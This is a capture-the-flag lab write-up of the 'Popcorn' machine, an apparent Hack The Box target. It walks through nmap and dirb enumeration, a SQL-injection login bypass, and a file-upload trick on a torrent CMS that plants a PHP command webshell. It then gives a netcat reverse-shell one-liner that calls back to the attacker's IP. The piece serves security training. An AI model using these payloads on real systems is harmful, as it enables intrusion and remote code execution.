First enumeration with nmap 

```
# Nmap 7.93 scan initiated Wed May 17 12:13:10 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80 -Pn 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 17 12:13:24 2023 -- 1 IP address (1 host up) scanned in 14.03 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/34f2bb05-236d-4107-95e9-4f812e523e1c)

noticed a web server running on port 80, openning it on a browser, got directed to a default web page. let's fuzz for hidden dirs.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Popcorn] 
└─$ dirb http://10.10.10.6/                                                                                                                                            
                                                                                                                                                                       
-----------------                                                                                                                                                      
DIRB v2.22                                                                                                                                                             
By The Dark Raver                                                                                                                                                      
-----------------                                                                                                                                                      
                                                                                                                                                                       
START_TIME: Wed May 17 11:43:45 2023                                                                                                                                   
URL_BASE: http://10.10.10.6/                                                                                                                                           
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                                                   
                                                                                                                                                                       
-----------------                                                                                                                                                      
                                                                                                                                                                       
GENERATED WORDS: 4612                                                                                                                                                  
                                                                                                                                                                       
---- Scanning URL: http://10.10.10.6/ ----                                                                                                                             
+ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)                                                                                                                       
+ http://10.10.10.6/index (CODE:200|SIZE:177)                                                                                                                          
+ http://10.10.10.6/index.html (CODE:200|SIZE:177)                                                                                                                     
+ http://10.10.10.6/server-status (CODE:403|SIZE:291)                                                                                                                  
+ http://10.10.10.6/test (CODE:200|SIZE:47330)                                                                                                                         
==> DIRECTORY: http://10.10.10.6/torrent/ 

---- Entering directory: http://10.10.10.6/torrent/ ----                                                                                                               
==> DIRECTORY: http://10.10.10.6/torrent/admin/                                                                                                                        
+ http://10.10.10.6/torrent/browse (CODE:200|SIZE:9278)                                                                                                                
+ http://10.10.10.6/torrent/comment (CODE:200|SIZE:936)                                                                                                                
+ http://10.10.10.6/torrent/config (CODE:200|SIZE:0)
```
cool we have a juicy dir `torrent`, let's check it out.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/818c8009-fae9-4ced-8fe2-f57b84f03ab2)

navigating to the torrent dir, got directed to a torrent hoster cms. let's try to login.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2a79dbbc-fc62-46d0-ac5b-75dac33f7cd4)

tried to bypass the login page using sqli payload `admin' or 1=1-- :admin' or 1=1-- `...

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/80fd833d-d2ac-4f51-a0bb-1f2fbc90094c)

Bull's eye it worked, we are in as admin. let's check for how to exploit this service `Torrent Hoster`. there's a file upload vuln let's exploit it.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Popcorn]
└─$ wget https://cdimage.kali.org/kali-2023.1/kali-linux-2023.1-installer-amd64.iso.torrent
--2023-05-18 00:31:47--  https://cdimage.kali.org/kali-2023.1/kali-linux-2023.1-installer-amd64.iso.torrent
Resolving cdimage.kali.org (cdimage.kali.org)... 192.99.200.113
Connecting to cdimage.kali.org (cdimage.kali.org)|192.99.200.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://kali.download/base-images/kali-2023.1/kali-linux-2023.1-installer-amd64.iso.torrent [following]
--2023-05-18 00:31:49--  https://kali.download/base-images/kali-2023.1/kali-linux-2023.1-installer-amd64.iso.torrent
Resolving kali.download (kali.download)... 104.18.103.100, 104.18.102.100, 2606:4700::6812:6664, ...
Connecting to kali.download (kali.download)|104.18.103.100|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 296259 (289K) [application/octet-stream]
Saving to: ‘kali-linux-2023.1-installer-amd64.iso.torrent’

kali-linux-2023.1-installer-amd64.iso.tor 100%[====================================================================================>] 289.32K   284KB/s    in 1.0s    

2023-05-18 00:31:51 (284 KB/s) - ‘kali-linux-2023.1-installer-amd64.iso.torrent’ saved [296259/296259]
```
first we download a torrent file from [torrent](https://cdimage.kali.org/kali-2023.1/kali-linux-2023.1-installer-amd64.iso.torrent). 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/160d762d-b62e-4dbd-9976-5603fb77ab5d)

click on the upload button and upload the torrent file you downloaded, after that click the upload torrent button.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9238a81c-d1c1-425e-96fc-dcec1361701a)

after uploading the torrent file, it will show there's no image file found. click on edit this torrent.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a5e1931b-21ed-43b2-9096-c29650a15abe)

upload an image file then intercept with burp.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/30f23cfb-585b-40c4-9d0a-c282809b383d)

delete all that image content, put a payload 

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/842c14a9-30e3-429f-b5ab-f77cc85b10eb)

replace those content with the php cmd webshell payload above, add .php to the image file, and send the request. now let's check the shell in the /upload dir.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/56a5585c-d30f-4a00-904e-614e9d74294b)

cool we got our php shell, let's try it out if we got RCE.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/943da629-c8ec-4dcc-a2fc-8a61f0b50853)

great we got RCE. let's get a reverse shell. fire up ncat listener 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.14 445 >/tmp/f
```
reverse shell payload.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1b6c65ba-e475-410c-ba69-fd80e3881ae6)

send the payload and check back ncat listener.










